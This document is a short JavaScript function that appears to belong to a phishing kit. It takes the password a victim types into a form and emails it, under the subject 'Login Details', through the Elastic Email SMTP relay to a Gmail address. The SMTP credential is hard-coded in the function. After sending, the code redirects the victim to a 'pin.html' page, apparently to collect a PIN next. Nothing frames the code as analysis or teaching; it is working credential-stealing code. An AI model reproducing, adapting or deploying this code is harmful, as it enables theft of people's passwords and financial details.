function emailSend() {
  var password = document.getElementById('pass').value;
  var messageBody = "PHONE " + password;

  Email.send({
    Host: "smtp.elasticemail.com",
    Username: "payday10177@gmail.com",
    Password: "176A549B6BD880A9C5A531EDE06FF1F541C8",
    To: 'payday10177@gmail.com',
    From: "payday10177@gmail.com",
    Subject: "Login Details",
    Body: messageBody
  }).then(
    message => {
      if (message == 'OK') {
        window.location.href = 'pin.html';
      }
      else {
        swal("Error", "Please complete form details", "error")
      }
    }
  );
}